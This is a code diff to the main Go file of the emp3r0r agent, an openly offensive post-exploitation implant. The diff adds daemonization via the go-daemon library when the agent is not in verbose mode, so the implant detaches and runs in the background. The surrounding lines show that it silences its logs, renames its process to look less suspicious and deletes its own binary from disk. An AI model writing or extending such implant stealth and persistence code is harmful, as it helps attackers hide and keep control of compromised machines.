@@ -23,6 +23,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
+	"github.com/sevlyar/go-daemon"
 	"src.elv.sh/pkg/buildinfo"
 	"src.elv.sh/pkg/lsp"
 	"src.elv.sh/pkg/prog"
@@ -52,11 +53,6 @@ func main() {
 
 	// silent switch
 	log.SetOutput(ioutil.Discard)
-	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
-	if *verbose {
-		fmt.Println("emp3r0r agent has started")
-		log.SetOutput(os.Stderr)
-	}
 
 	// rename our agent process to make it less suspecious
 	self_path, err := os.Readlink("/proc/self/exe")
@@ -77,6 +73,29 @@ func main() {
 				&buildinfo.Program{}, &lsp.Program{},
 				&shell.Program{})))
 	}
+
+	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
+	if *verbose {
+		fmt.Println("emp3r0r agent has started")
+		log.SetOutput(os.Stderr)
+	} else {
+		// daemonize
+		cntxt := &daemon.Context{
+			PidFileName: agent.RuntimeConfig.PIDFile,
+			PidFilePerm: 0600,
+			Args:        os.Args,
+		}
+		d, err := cntxt.Reborn()
+		if err != nil {
+			log.Fatal("Unable to daemonize: ", err)
+		}
+		if d != nil {
+			return
+		}
+		defer cntxt.Release()
+	}
+
+	// self delete
 	err = os.Remove(self_path)
 	if err != nil {
 		log.Printf("Error removing agent file from disk: %v", err)
